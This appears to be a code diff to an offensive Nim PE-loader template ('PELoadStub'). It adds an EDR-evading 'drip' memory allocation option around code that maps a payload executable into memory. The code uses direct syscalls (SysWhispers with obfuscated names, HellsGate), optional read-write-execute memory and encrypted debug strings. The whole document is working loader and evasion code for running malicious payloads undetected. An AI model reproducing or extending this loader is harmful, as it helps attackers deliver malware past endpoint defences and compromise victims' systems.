@@ -246,16 +246,26 @@ let PELoadStub * = """
           protectionValue = PAGE_READWRITE
         when defined(RWX):
           protectionValue = PAGE_EXECUTE_READWRITE
-        
 
-        when defined(SysWhispers):
-            status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
-        else:
-            status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
-        
-        when defined(verbose):
-          echo obf("NtAllocateVirtualMemory:")
-          echo status
+        when defined(AllocateDripStyle):
+          preferAddr = DripAllocate(HANDLE(-1), cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage), friendlycode)
+          if preferAddr == nil:
+              when defined(verbose):
+                  echo obf("[-] DripAllocation Failed")
+              quit(1)
+          else:
+              when defined(verbose):
+                  echo obf("[+] DripAllocation Success!")
+        else:        
+
+          when defined(SysWhispers):
+              status = oqiahsjynmxkla(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
+          else:
+              status = NtAllocateVirtualMemory(curProcHandle, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,protectionValue)
+          
+          when defined(verbose):
+            echo obf("NtAllocateVirtualMemory:")
+            echo status
         
         
         if (preferAddr == nil and relocDir == nil):
@@ -266,36 +276,38 @@ let PELoadStub * = """
             ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
         else:
             ntHeader.OptionalHeader.ImageBase = cast[DWORD](preferAddr)
-        var bytesWritten: SIZE_T
-        when defined(HellsGate):
-            if getSyscall(ntWriteTable):
-                syscall = ntWriteTable.wSysCall
-            else:
-                when defined(verbose):
-                  echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-        when defined(SysWhispers):
-            status = oqiazasusjk(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
-        else:
-            status = NtWriteVirtualMemory(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
         
-        when defined(verbose):
-          echo obf("NtWriteVirtualMemory:")
-          echo status
-        
-        
-        var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[SIZE_T](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
-        var i: int = 0
-        while i < cast[int](ntHeader.FileHeader.NumberOfSections):
-          var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
-          var source: LPVOID = (peToLoadPtr + SectionHeaderArr[i].PointerToRawData)
+        when not defined(AllocateDripStyle):
+          var bytesWritten: SIZE_T
+          when defined(HellsGate):
+              if getSyscall(ntWriteTable):
+                  syscall = ntWriteTable.wSysCall
+              else:
+                  when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
           when defined(SysWhispers):
-            status = oqiazasusjk(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+              status = oqiazasusjk(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
           else:
-              status = NtWriteVirtualMemory(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+              status = NtWriteVirtualMemory(curProcHandle,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
+          
           when defined(verbose):
-            echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
+            echo obf("NtWriteVirtualMemory:")
             echo status
-          inc(i)
+        
+        
+          var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[SIZE_T](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
+          var i: int = 0
+          while i < cast[int](ntHeader.FileHeader.NumberOfSections):
+            var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
+            var source: LPVOID = (peToLoadPtr + SectionHeaderArr[i].PointerToRawData)
+            when defined(SysWhispers):
+              status = oqiazasusjk(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+            else:
+                status = NtWriteVirtualMemory(curProcHandle,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+            when defined(verbose):
+              echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
+              echo status
+            inc(i)
         
         var goodrun = fixIAT(preferAddr)
         
